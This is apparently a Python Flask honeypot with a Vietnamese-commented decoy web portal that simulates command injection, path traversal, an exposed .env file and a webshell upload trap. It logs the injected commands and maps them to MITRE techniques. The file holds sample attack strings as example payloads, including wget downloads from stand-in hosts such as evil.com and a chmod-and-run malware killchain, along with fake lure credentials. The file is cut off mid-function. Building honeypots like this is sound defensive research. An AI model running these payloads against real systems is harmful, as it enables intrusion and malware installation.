#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
ADAPTIVE HONEYPOT - INTERACTIVE WEB DECOY & VULNERABILITY LAB (LỚP 7)
=============================================================================
Web Application doanh nghiệp mồi nhử (NexusCloud Enterprise Operations Portal).
Cung cấp giao diện Web UI tương tác trực tiếp trên trình duyệt lẫn API:
  1. Network Diagnostic Tool: Lỗ hổng Command Injection (RCE)
     -> Chèn lệnh: 127.0.0.1; whoami; uname -a; wget http://evil.com/bot.sh
     -> Bóc tách toàn bộ lệnh, lưu full_session cho AI Máy 2, đối soát MISP.
  2. Configuration & Backup Vault: Lỗ hổng Lộ file (.env, config.php, backup.json)
     -> Rò rỉ tài khoản SSH (ubuntu / supersecretpassword123 / port 2222) để dụ hacker nhảy vào SSH.
  3. System File Reader: Lỗ hổng Local File Inclusion (LFI / Path Traversal)
     -> /api/view?file=../../../../etc/passwd
  4. Firmware / Patch Uploader: Lỗ hổng Tải mã độc lên máy chủ (Webshell Upload)
     -> Thu gom file vào thư mục quarantine/ và cảnh báo SOC.
"""

import os
import re
import sys
import json
import time
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

from flask import Flask, request, jsonify, Response, render_template_string

BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

from config import WEB_HOST, WEB_PORT, SSH_PORT, LOGS_DIR, QUARANTINE_DIR, HONEYPOT_ALLOWED_PASSWORDS
from threat_intel.logger import HoneypotLogger, UNLABELED_SESSIONS_FILE
from threat_intel.misp_comparator import misp_comparator
from threat_intel.mitre_mapper import MitreMapper
from threat_intel.csic_logger import csic_logger, CSIC_CSV_FILE, CSIC_UNLABELED_JSONL

app = Flask(__name__)
logger = HoneypotLogger()

@app.before_request
def record_csic_http_traffic():
    """Tự động ghi lại mọi request HTTP theo đúng chuẩn schema CSIC 2010 (csic_database.csv)"""
    if not request.path.startswith("/api/feed/"):
        csic_logger.log_flask_request(request)

LURE_PASSWORD = HONEYPOT_ALLOWED_PASSWORDS[-1] if HONEYPOT_ALLOWED_PASSWORDS else "supersecretpassword123"

# =============================================================================
# BỘ TÁCH & PHÂN TÍCH LỆNH COMMAND INJECTION (RCE)
# =============================================================================

def extract_injected_commands(raw_param: str) -> list:
    """
    Trích xuất các câu lệnh Linux từ chuỗi Command Injection của hacker.
    Ví dụ: '127.0.0.1;whoami;uname -a;wget http://evil.com/bot.sh'
    -> ['whoami', 'uname -a', 'wget http://evil.com/bot.sh']
    """
    if not raw_param:
        return []
    
    decoded = urllib.parse.unquote_plus(raw_param).strip()
    clean_text = decoded
    
    # Chuẩn hóa subshell $(...) và backticks `...`
    backticks = re.findall(r'`([^`]+)`', decoded)
    subshells = re.findall(r'\$\(([^)]+)\)', decoded)
    for b in backticks + subshells:
        clean_text = clean_text.replace(f"`{b}`", f"; {b} ;").replace(f"$({b})", f"; {b} ;")

    tokens = re.split(r';|&&|\|\||\|', clean_text)
    commands = []
    
    for t in tokens:
        cmd = t.strip()
        # Bỏ qua IP hợp lệ của lệnh ping đầu tiên
        if re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', cmd) or cmd in ("127.0.0.1", "localhost", "8.8.8.8", "1.1.1.1"):
            continue
        if not cmd:
            continue
        commands.append(cmd)
        
    return commands


def simulate_command_execution(cmd: str) -> str:
    """
    Mô phỏng kết quả trả về của các lệnh Linux chân thực khi hacker RCE.
    """
    cmd_lower = cmd.lower().strip()
    
    if cmd_lower in ("whoami",):
        return "www-data\n"
    if cmd_lower in ("id",):
        return "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
    if "uname" in cmd_lower:
        return "Linux nexus-cloud-infra 5.15.0-89-generic #99-Ubuntu SMP Fri Nov 3 14:00:00 UTC 2026 x86_64 x86_64 GNU/Linux\n"
    if "cat /etc/passwd" in cmd_lower:
        return (
            "root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
            "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
            "ubuntu:x:1000:1000:Ubuntu User,,,:/home/ubuntu:/bin/bash\n"
        )
    if "cat /proc/mounts" in cmd_lower:
        return (
            "/dev/sda1 / ext4 rw,relatime 0 0\n"
            "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\n"
            "sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0\n"
            "tmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0\n"
        )
    if "netstat" in cmd_lower or "ss -t" in cmd_lower:
        return (
            "Active Internet connections (only servers)\n"
            "Proto Recv-Q Send-Q Local Address           Foreign Address         State      \n"
            f"tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     \n"
            f"tcp        0      0 0.0.0.0:{SSH_PORT}            0.0.0.0:*               LISTEN     \n"
            "tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN     \n"
        )
    if "cat .env" in cmd_lower or "cat /var/www/.env" in cmd_lower:
        return (
            "# Production Environment Configuration\n"
            "APP_ENV=production\n"
            "DB_HOST=127.0.0.1\n"
            f"SSH_INTERNAL_PORT={SSH_PORT}\n"
            "SSH_USER=ubuntu\n"
            f"SSH_PASSWORD={LURE_PASSWORD}\n"
        )
    if cmd_lower.startswith("wget ") or cmd_lower.startswith("curl "):
        url_match = re.search(r'https?://\S+', cmd)
        url = url_match.group(0) if url_match else "http://malware.xyz/bot.sh"
        filename = url.split("/")[-1] or "downloaded_payload"
        return (
            f"--2026-11-14 13:10:00--  {url}\n"
            f"Resolving evil.server (evil.server)... 185.220.101.5\n"
            f"Connecting to evil.server (evil.server)|185.220.101.5|:80... connected.\n"
            f"HTTP request sent, awaiting response... 200 OK\n"
            f"Length: 4210 (4.1K) [text/x-sh]\n"
            f"Saving to: '{filename}'\n\n"
            f"{filename}          100%[===================>]   4.11K  --.-KB/s    in 0.001s\n\n"
            f"2026-11-14 13:10:00 (4.11 MB/s) - '{filename}' saved [4210/4210]\n"
        )
    if cmd_lower.startswith("chmod "):
        return ""
    if cmd_lower.startswith("rm "):
        return ""
    if "./" in cmd_lower or cmd_lower.startswith("sh "):
        return "[+] Process executed in background (PID 4821)\n"
    if "ls" in cmd_lower:
        return "app.py  config.php  dist  index.html  package.json  static  uploads  .env\n"
    if "pwd" in cmd_lower:
        return "/var/www/html\n"
    
    return f"{cmd.split()[0]}: command executed.\n"


def process_rce_payload(client_ip: str, client_port: int, raw_payload: str, endpoint: str) -> dict:
    """
    Xử lý payload RCE: Trích xuất lệnh, format chuỗi full_session chuẩn train parquet,
    gán nhãn MITRE, lưu unlabeled_sessions.jsonl, và đối soát MISP IoC.
    """
    commands = extract_injected_commands(raw_payload)
    if not commands:
        commands = [raw_payload.strip()]

    full_session = " ; ".join(commands) + " ;"

    now_dt = datetime.now(timezone.utc)
    now_iso = now_dt.isoformat()
    now_str = now_dt.strftime("%Y-%m-%d %H:%M:%S")
    session_id = f"web-rce-{int(time.time())}-{client_ip.replace('.', '_')}"

    # 1. Ghi log chưa gán nhãn cho AI
    unlabeled_record = {
        "session_id": session_id,
        "attacker_ip": client_ip,
        "attacker_port": client_port,
        "timestamp": now_iso,
        "first_timestamp": now_str,
        "auth": {
            "username": "www-data",
            "password": "N/A (Web RCE / Command Injection)"
        },
        "commands": commands,
        "full_session": full_session,
        "source": "WEB_L7_RCE",
        "endpoint": endpoint
    }

    try:
        with open(UNLABELED_SESSIONS_FILE, "a", encoding="utf-8") as uf:
            uf.write(json.dumps(unlabeled_record, ensure_ascii=False) + "\n")
    except Exception as e:
        print(f"[!] Lỗi ghi unlabeled_sessions.jsonl: {e}")

    # 2. Đối soát MISP
    misp_result = None
    try:
        misp_result = misp_comparator.compare_session(unlabeled_record)
    except Exception as e:
        print(f"[!] Lỗi đối soát MISP: {e}")

    # 3. Gán nhãn MITRE ATT&CK
    for cmd in commands:
        mitre_block = MitreMapper.map_command(cmd)
        tactic = mitre_block.get("tactic_name", "Execution")
        tech_id = mitre_block.get("technique_id", "T1059.004")
        tech_name = mitre_block.get("technique_name", "Unix Shell")
        event_record = {
            "timestamp": now_iso,
            "source_ip": client_ip,
            "source_port": client_port,
            "protocol": "HTTP_RCE",
            "session_id": session_id,
            "username": "www-data",
            "event_status": "Command_Executed",
            "message": f"Web RCE Injection [{endpoint}] -> {cmd}",
            "command": cmd,
            "command_output": simulate_command_execution(cmd),
            "handler_type": "WEB_COMMAND_INJECTION",
            "latency_ms": 2.1,
            "mitre_tactic": tactic,
            "mitre_technique_id": tech_id,
            "mitre_technique_name": tech_name,
            "severity": "Critical" if any(x in cmd for x in ["wget", "curl", "rm", "chmod"]) else "High",
            "misp_matches": misp_result.get("matched_iocs", []) if misp_result else []
        }
        logger._write_event(event_record)

    # 4. Lưu session tổng hợp vào sessions.json
    export_sess = {
        "session_id": session_id,
        "attacker_ip": client_ip,
        "attacker_port": client_port,
        "timestamp": now_iso,
        "first_timestamp": now_str,
        "auth": {
            "username": "www-data",
            "password": "N/A (Web RCE)"
        },
        "commands": commands,
        "full_session": full_session,
        "source_ip": client_ip,
        "source_port": client_port,
        "username": "www-data",
        "passwords_tried": ["N/A (Web RCE)"],
        "start_time": now_iso,
        "end_time": now_iso,
        "duration_seconds": 1,
        "command_count": len(commands),
        "status": "Closed",
        "misp_intel": misp_result,
        "attack_vector": "Layer 7 Web RCE -> Pivot to SSH"
    }

    try:
        sess_file = LOGS_DIR / "sessions.json"
        all_s = []
        if sess_file.exists():
            with open(sess_file, "r", encoding="utf-8") as f:
                all_s = json.load(f)
        all_s.insert(0, export_sess)
        with open(sess_file, "w", encoding="utf-8") as f:
            json.dump(all_s[:100], f, indent=2, ensure_ascii=False)
    except Exception:
        pass

    print(f"\n🔥 [WEB RCE DETECTED] IP: {client_ip}:{client_port}")
    print(f"👉 Injected Commands ({len(commands)}): {commands}")
    print(f"👉 Parquet full_session: {full_session}")
    if misp_result and misp_result.get("match_count", 0) > 0:
        print(f"🚨 [MISP MATCH]: Phát hiện {misp_result['match_count']} IoC độc hại trùng khớp!")

    return {
        "session_id": session_id,
        "commands": commands,
        "full_session": full_session,
        "misp_result": misp_result
    }


# =============================================================================
# GIAO DIỆN WEB UI TƯƠNG TÁC (FRONTEND CHO HACKER / TESTER TẤN CÔNG)
# =============================================================================

HTML_PORTAL_TEMPLATE = """
<!DOCTYPE html>
<html lang="vi" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NexusCloud Enterprise Operations Portal (Vulnerable Honeypot Web)</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap');
    body { font-family: 'Inter', sans-serif; }
    .mono { font-family: 'JetBrains Mono', monospace; }
    .terminal-scroll::-webkit-scrollbar { width: 6px; }
    .terminal-scroll::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
  </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen">

  <!-- Header -->
  <header class="border-b border-slate-800 bg-slate-900/80 backdrop-blur sticky top-0 z-50">
    <div class="max-w-7xl mx-auto px-4 py-3 flex justify-between items-center">
      <div class="flex items-center space-x-3">
        <div class="bg-gradient-to-tr from-indigo-500 to-cyan-400 p-2 rounded-lg shadow-lg shadow-indigo-500/20">
          <i class="fa-solid fa-cloud-bolt text-white text-xl"></i>
        </div>
        <div>
          <h1 class="text-lg font-bold tracking-tight text-white flex items-center gap-2">
            NexusCloud Portal
            <span class="text-xs font-mono bg-red-950 text-red-400 border border-red-800 px-2 py-0.5 rounded-full">LIVE HONEYPOT TARGET</span>
          </h1>
          <p class="text-xs text-slate-400">Enterprise Infrastructure Gateway • Lớp 7 Hứng Tấn Công</p>
        </div>
      </div>
      <div class="flex items-center space-x-3 text-xs">
        <span class="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
          <span class="h-2 w-2 rounded-full bg-emerald-500 animate-pulse"></span>
          Web Gateway: Online (Port {{ web_port }})
        </span>
        <span class="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/20">
          <i class="fa-solid fa-lock text-xs"></i>
          SSH Bastion: Port {{ ssh_port }}
        </span>
        <a href="http://{{ request_host.split(':')[0] }}:8080" target="_blank" class="px-3 py-1.5 rounded-md bg-indigo-600 hover:bg-indigo-500 text-white font-medium flex items-center gap-1.5 transition">
          <i class="fa-solid fa-chart-line"></i> SOC Dashboard
        </a>
      </div>
    </div>
  </header>

  <!-- Main Content -->
  <main class="max-w-7xl mx-auto px-4 py-8 space-y-8">

    <!-- Top Alert Banner -->
    <div class="p-4 rounded-xl border border-indigo-900/60 bg-gradient-to-r from-indigo-950/40 via-purple-950/20 to-slate-900 flex items-start gap-4 shadow-xl">
      <div class="p-3 bg-indigo-500/10 text-indigo-400 rounded-lg shrink-0 mt-0.5">
        <i class="fa-solid fa-shield-halved text-xl"></i>
      </div>
      <div class="text-sm space-y-1">
        <h3 class="font-semibold text-indigo-300">Mô hình Deception thực tế: Hacker tấn công Web -> RCE -> Pivot sang SSH</h3>
        <p class="text-slate-300">
          Trang web này chứa các <strong>lỗ hổng mồi nhử</strong> có chủ đích để bẫy hacker. Bạn có thể test trực tiếp bằng cách click các nút mẫu bên dưới hoặc dùng <code class="bg-slate-800 px-1 py-0.5 rounded text-cyan-400">curl</code> / <code class="bg-slate-800 px-1 py-0.5 rounded text-cyan-400">Burp Suite</code>.
        </p>
      </div>
    </div>

    <!-- 4 Attack Vectors Grid -->
    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">

      <!-- LEFT: VULNERABILITY 1 - COMMAND INJECTION (RCE) -->
      <div class="lg:col-span-7 space-y-6">
        <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl">
          <div class="flex items-center justify-between border-b border-slate-800 pb-4 mb-4">
            <div class="flex items-center space-x-3">
              <div class="p-2 bg-rose-500/10 text-rose-400 rounded-lg">
                <i class="fa-solid fa-terminal text-lg"></i>
              </div>
              <div>
                <h2 class="text-base font-bold text-white">Lỗ hổng 1: Command Injection (RCE Lớp 7)</h2>
                <p class="text-xs text-slate-400 font-mono">Endpoint: /api/ping?host={payload}</p>
              </div>
            </div>
            <span class="text-xs bg-rose-500/20 text-rose-300 border border-rose-500/30 px-2 py-0.5 rounded font-mono">MITRE T1059.004</span>
          </div>

          <!-- Payload Form -->
          <div class="space-y-4">
            <div>
              <label class="block text-xs font-medium text-slate-300 mb-1.5">
                Nhập địa chỉ Host hoặc chèn chuỗi lệnh RCE độc hại:
              </label>
              <div class="flex gap-2">
                <input id="pingInput" type="text" 
                  value="127.0.0.1;whoami;uname -a;wget http://evil.com/shell.sh" 
                  class="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-3.5 py-2.5 text-sm font-mono text-cyan-300 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition" 
                  placeholder="e.g. 127.0.0.1; id; cat /etc/passwd">
                <button onclick="executeRCE()" id="btnRunRCE" class="px-5 py-2.5 bg-rose-600 hover:bg-rose-500 text-white font-medium text-sm rounded-lg flex items-center gap-2 transition shadow-lg shadow-rose-600/30">
                  <i class="fa-solid fa-play"></i> Thực thi RCE
                </button>
              </div>
            </div>

            <!-- Quick Attack Snippets -->
            <div class="space-y-1.5">
              <span class="text-xs text-slate-400">Payload mẫu phổ biến của Hacker (Bấm để điền nhanh):</span>
              <div class="flex flex-wrap gap-2 text-xs font-mono">
                <button onclick="setPayload('127.0.0.1;whoami;uname -a;wget http://evil.com/shell.sh')" 
                  class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition">
                  Discovery + Download Shell
                </button>
                <button onclick="setPayload('127.0.0.1;id;cat /etc/passwd;netstat -tuln')" 
                  class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition">
                  User & Port Enumeration
                </button>
                <button onclick="setPayload('127.0.0.1;cat .env')" 
                  class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-amber-300 border border-amber-800/60 transition">
                  Lấy mật khẩu SSH từ .env
                </button>
                <button onclick="setPayload('127.0.0.1;cd /dev/shm;wget http://malware.xyz/bot.sh;chmod +x bot.sh;./bot.sh;rm -rf bot.sh')" 
                  class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-rose-300 border border-rose-800/60 transition">
                  Full Malware Killchain
                </button>
              </div>
            </div>

            <!-- Terminal Output Window -->
            <div class="rounded-lg bg-black border border-slate-800 overflow-hidden shadow-2xl">
              <div class="bg-slate-900/90 px-4 py-2 border-b border-slate-800 flex items-center justify-between text-xs text-slate-400 font-mono">
                <div class="flex items-center space-x-2">
                  <span class="h-2.5 w-2.5 rounded-full bg-red-500/80 inline-block"></span>
                  <span class="h-2.5 w-2.5 rounded-full bg-yellow-500/80 inline-block"></span>
                  <span class="h-2.5 w-2.5 rounded-full bg-green-500/80 inline-block"></span>
                  <span class="ml-2 text-slate-300 font-medium">bash / simulated shell output</span>
                </div>
                <span id="execStatus" class="text-slate-500">Ready</span>
              </div>
              <pre id="terminalOutput" class="p-4 text-xs font-mono text-emerald-400 h-64 overflow-y-auto terminal-scroll leading-relaxed select-all"># Output phản hồi từ hệ thống Linux mô phỏng sẽ hiển thị tại đây...
# Hệ thống tự động bóc tách lệnh shell, lưu full_session cho AI và đối soát MISP!</pre>
            </div>
          </div>
        </div>
      </div>

      <!-- RIGHT: VULNERABILITY 2 & 3 - SENSITIVE LEAK & LFI & WEBSHELL -->
      <div class="lg:col-span-5 space-y-6">

        <!-- Lỗ hổng 2: Lộ file cấu hình (.env) -->
        <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl space-y-4">
          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
            <div class="flex items-center space-x-3">
              <div class="p-2 bg-amber-500/10 text-amber-400 rounded-lg">
                <i class="fa-solid fa-key text-lg"></i>
              </div>
              <div>
                <h3 class="text-sm font-bold text-white">Lỗ hổng 2: Lộ File Cấu Hình (.env)</h3>
                <p class="text-xs text-slate-400">Credential Access để Pivot sang SSH</p>
              </div>
            </div>
            <span class="text-xs bg-amber-500/20 text-amber-300 border border-amber-500/30 px-2 py-0.5 rounded font-mono">MITRE T1552.001</span>
          </div>

          <p class="text-xs text-slate-300">
            Hacker thường scan các file nhạy cảm trước khi tấn công. Các file này mồi nhử thông tin tài khoản SSH nội bộ:
          </p>

          <div class="grid grid-cols-2 gap-2 text-xs font-mono">
            <a href="/.env" target="_blank" class="p-2.5 rounded bg-slate-950 hover:bg-slate-800 border border-slate-800 text-amber-300 flex items-center justify-between transition">
              <span>/.env (File nhạy cảm)</span>
              <i class="fa-solid fa-arrow-up-right-from-square text-xs text-slate-500"></i>
            </a>
            <a href="/config.php" target="_blank" class="p-2.5 rounded bg-slate-950 hover:bg-slate-800 border border-slate-800 text-amber-300 flex items-center justify-between transition">
              <span>/config.php (Backup)</span>
              <i class="fa-solid fa-arrow-up-right-from-square text-xs text-slate-500"></i>
            </a>
            <a href="/robots.txt" target="_blank" class="p-2.5 rounded bg-slate-950 hover:bg-slate-800 border border-slate-800 text-slate-300 flex items-center justify-between transition">
              <span>/robots.txt (Mồi nhử)</span>
              <i class="fa-solid fa-arrow-up-right-from-square text-xs text-slate-500"></i>
            </a>
            <a href="/api/internal/config" target="_blank" class="p-2.5 rounded bg-slate-950 hover:bg-slate-800 border border-slate-800 text-slate-300 flex items-center justify-between transition">
              <span>/api/internal/config</span>
              <i class="fa-solid fa-arrow-up-right-from-square text-xs text-slate-500"></i>
            </a>
          </div>

          <div class="p-3 bg-amber-950/20 border border-amber-800/40 rounded-lg text-xs text-amber-300/90 flex items-start gap-2">
            <i class="fa-solid fa-circle-exclamation shrink-0 mt-0.5"></i>
            <span>Khi hacker click hoặc curl <code class="text-white font-mono">/.env</code>, họ sẽ lấy được: User: <strong>ubuntu</strong> | Pass: <strong>{{ lure_password }}</strong> | Port: <strong>{{ ssh_port }}</strong> để SSH vào bẫy!</span>
          </div>
        </div>

        <!-- Lỗ hổng 3: Local File Inclusion (LFI / Path Traversal) -->
        <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl space-y-4">
          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
            <div class="flex items-center space-x-3">
              <div class="p-2 bg-cyan-500/10 text-cyan-400 rounded-lg">
                <i class="fa-solid fa-folder-open text-lg"></i>
              </div>
              <div>
                <h3 class="text-sm font-bold text-white">Lỗ hổng 3: Path Traversal (LFI)</h3>
                <p class="text-xs text-slate-400 font-mono">Endpoint: /api/view?file={path}</p>
              </div>
            </div>
            <span class="text-xs bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 px-2 py-0.5 rounded font-mono">MITRE T1006</span>
          </div>

          <div class="flex gap-2">
            <input id="lfiInput" type="text" value="../../../../etc/passwd" 
              class="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-500">
            <button onclick="executeLFI()" class="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-medium rounded-lg transition">
              Đọc file
            </button>
          </div>
        </div>

        <!-- Lỗ hổng 4: Webshell / Payload Upload -->
        <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl space-y-4">
          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
            <div class="flex items-center space-x-3">
              <div class="p-2 bg-purple-500/10 text-purple-400 rounded-lg">
                <i class="fa-solid fa-file-arrow-up text-lg"></i>
              </div>
              <div>
                <h3 class="text-sm font-bold text-white">Lỗ hổng 4: Web Shell Upload Decoy</h3>
                <p class="text-xs text-slate-400 font-mono">POST /api/upload (Thu gom mã độc)</p>
              </div>
            </div>
            <span class="text-xs bg-purple-500/20 text-purple-300 border border-purple-500/30 px-2 py-0.5 rounded font-mono">MITRE T1505.003</span>
          </div>

          <form id="uploadForm" enctype="multipart/form-data" onsubmit="executeUpload(event)" class="space-y-3">
            <input id="fileUploadInput" type="file" name="payload" 
              class="block w-full text-xs text-slate-400 file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-slate-800 file:text-slate-200 hover:file:bg-slate-700">
            <button type="submit" class="w-full py-2 bg-purple-600 hover:bg-purple-500 text-white text-xs font-medium rounded-lg transition">
              Tải payload lên bẫy (Lưu vào quarantine/)
            </button>
          </form>
          <div id="uploadStatus" class="text-xs font-mono text-slate-400"></div>
        </div>

      </div>
    </div>

  </main>

  <script>
    function setPayload(val) {
      document.getElementById('pingInput').value = val;
    }

    async function executeRCE() {
      const input = document.getElementById('pingInput').value;
      const term = document.getElementById('terminalOutput');
      const status = document.getElementById('execStatus');
      const btn = document.getElementById('btnRunRCE');

      status.innerText = "Executing...";
      status.className = "text-amber-400 animate-pulse";
      btn.disabled = true;

      term.innerText = "$ ping -c 1 " + input + "\\n[+] Intercepting request and extracting commands...";

      try {
        const res = await fetch('/api/ping?host=' + encodeURIComponent(input));
        const text = await res.text();
        term.innerText = text;
        status.innerText = "HTTP " + res.status + " OK (Captured by Honeypot)";
        status.className = "text-emerald-400";
      } catch (e) {
        term.innerText = "Error executing request: " + e;
        status.innerText = "Failed";
        status.className = "text-red-400";
      } finally {
        btn.disabled = false;
      }
    }

    async function executeLFI() {
      const file = document.getElementById('lfiInput').value;
      const term = document.getElementById('terminalOutput');
      term.innerText = "$ cat " + file + "\\n";
      try {
        const res = await fetch('/api/view?file=' + encodeURIComponent(file));
        const text = await res.text();
        term.innerText += text;
      } catch (e) {
        term.innerText += "Error: " + e;
      }
    }

    async function executeUpload(e) {
      e.preventDefault();
      const input = document.getElementById('fileUploadInput');
      const statusDiv = document.getElementById('uploadStatus');
      if (!input.files || input.files.length === 0) {
        statusDiv.innerText = "Vui lòng chọn 1 file payload (.sh, .php) trước!";
        statusDiv.className = "text-amber-400 text-xs";
        return;
      }

      const formData = new FormData();
      formData.append("payload", input.files[0]);

      statusDiv.innerText = "Đang tải lên...";
      try {
        const res = await fetch('/api/upload', { method: 'POST', body: formData });
        const data = await res.json();
        statusDiv.innerText = "✅ " + data.message;
        statusDiv.className = "text-emerald-400 text-xs";
      } catch (err) {
        statusDiv.innerText = "Lỗi upload: " + err;
        statusDiv.className = "text-red-400 text-xs";
      }
    }
  </script>
</body>
</html>
"""

# =============================================================================
# CÁC ROUTE CỦA WEB DECOY HONEYPOT
# =============================================================================

@app.route("/")
def index():
    """Giao diện Web Portal Doanh nghiệp (Frontend tương tác trực tiếp)"""
    client_ip = request.remote_addr or "127.0.0.1"
    logger._write_event({
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": client_ip,
        "source_port": request.environ.get("REMOTE_PORT", 80),
        "protocol": "HTTP",
        "session_id": f"web-recon-{client_ip.replace('.', '_')}",
        "username": "guest",
        "event_status": "Reconnaissance",
        "message": f"Web Recon: Truy cập cổng quản trị Web Portal",
        "command": f"GET {request.path}",
        "handler_type": "WEB_DECOY",
        "mitre_tactic": "Discovery",
        "mitre_technique_id": "T1046",
        "mitre_technique_name": "Network Service Discovery",
        "severity": "Low"
    })
    
    return render_template_string(
        HTML_PORTAL_TEMPLATE,
        web_port=WEB_PORT,
        ssh_port=SSH_PORT,
        lure_password=LURE_PASSWORD,
        request_host=request.host or f"localhost:{WEB_PORT}"
    )


@app.route("/robots.txt")
def robots():
    """Mồi nhử hacker vào các file nhạy cảm"""
    return Response(
        "User-agent: *\nDisallow: /.env\nDisallow: /admin\nDisallow: /config.php\nDisallow: /api/ping\nDisallow: /api/view\nDisallow: /backup/\n",
        mimetype="text/plain"
    )


@app.route("/.env")
@app.route("/config.php")
@app.route("/.git/config")
@app.route("/api/internal/config")
def sensitive_leak():
    """
    LỖ HỔNG LỘ FILE CẤU HÌNH (Credential Access - T1552.001)
    """
    client_ip = request.remote_addr or "127.0.0.1"
    client_port = request.environ.get("REMOTE_PORT", 80)
    now_iso = datetime.now(timezone.utc).isoformat()
    
    logger._write_event({
        "timestamp": now_iso,
        "source_ip": client_ip,
        "source_port": client_port,
        "protocol": "HTTP",
        "session_id": f"web-leak-{client_ip.replace('.', '_')}",
        "username": "attacker",
        "event_status": "Credential_Harvesting",
        "message": f"Khai thác lộ file nhạy cảm {request.path} để lấy SSH credentials!",
        "command": f"GET {request.path}",
        "handler_type": "WEB_SENSITIVE_LEAK",
        "mitre_tactic": "Credential Access",
        "mitre_technique_id": "T1552.001",
        "mitre_technique_name": "Credentials in Files: Configuration Files",
        "severity": "Critical"
    })
    
    print(f"\n🚨 [LEAK EXPLOIT] IP: {client_ip} vừa trích xuất file {request.path} để lấy tài khoản SSH!")

    leak_content = f"""# =========================================================
# PRODUCTION INFRASTRUCTURE CONFIGURATION - CONFIDENTIAL
# =========================================================
APP_NAME=Enterprise-Cloud-Gateway
APP_ENV=production
APP_KEY=base64:Xk8m9Qz21L4v8N3bP9q0Ws7dF6hJ2kL4=
APP_DEBUG=false

# Database Configuration
DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_PORT=5432
DB_DATABASE=cloud_prod
DB_USERNAME=postgres
DB_PASSWORD=SuperSecurePostgres2026!

# Internal Maintenance & Bastion SSH (Pivoting Jump Host)
# Note: Connect via internal gateway on port {SSH_PORT}
SSH_INTERNAL_HOST=127.0.0.1
SSH_INTERNAL_PORT={SSH_PORT}
SSH_MAINTENANCE_USER=ubuntu
SSH_MAINTENANCE_PASS={LURE_PASSWORD}
"""
    return Response(leak_content, mimetype="text/plain")


@app.route("/api/ping", methods=["GET", "POST"])
@app.route("/ping", methods=["GET", "POST"])
@app.route("/diagnostics", methods=["GET", "POST"])
@app.route("/api/tools/ping", methods=["GET", "POST"])
def vulnerable_ping_rce():
    """
    LỖ HỔNG COMMAND INJECTION (RCE) (T1190 & T1059.004)
    """
    client_ip = request.remote_addr or "127.0.0.1"
    client_port = int(request.environ.get("REMOTE_PORT", 80))

    target = (
        request.args.get("host") or 
        request.args.get("ip") or 
        request.args.get("cmd") or 
        request.args.get("target") or 
        (request.form.get("host") if request.form else None) or 
        (request.json.get("host") if request.is_json and request.json else None) or 
        "127.0.0.1"
    )

    has_injection = any(sep in target for sep in [";", "&&", "||", "|", "`", "$("]) or request.args.get("cmd") is not None

    if has_injection:
        rce_res = process_rce_payload(client_ip, client_port, target, request.path)
        output_lines = [
            f"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.",
            f"64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.035 ms",
            f"--- 127.0.0.1 ping statistics ---",
            f"1 packets transmitted, 1 received, 0% packet loss\n"
        ]
        
        for c in rce_res["commands"]:
            cmd_out = simulate_command_execution(c)
            if cmd_out:
                output_lines.append(cmd_out)

        final_response = "\n".join(output_lines)
        return Response(final_response, mimetype="text/plain")
    else:
        res = (
            f"PING {target} ({target}) 56(84) bytes of data.\n"
            f"64 bytes from {target}: icmp_seq=1 ttl=64 time=0.042 ms\n"
            f"64 bytes from {target}: icmp_seq=2 ttl=64 time=0.039 ms\n"
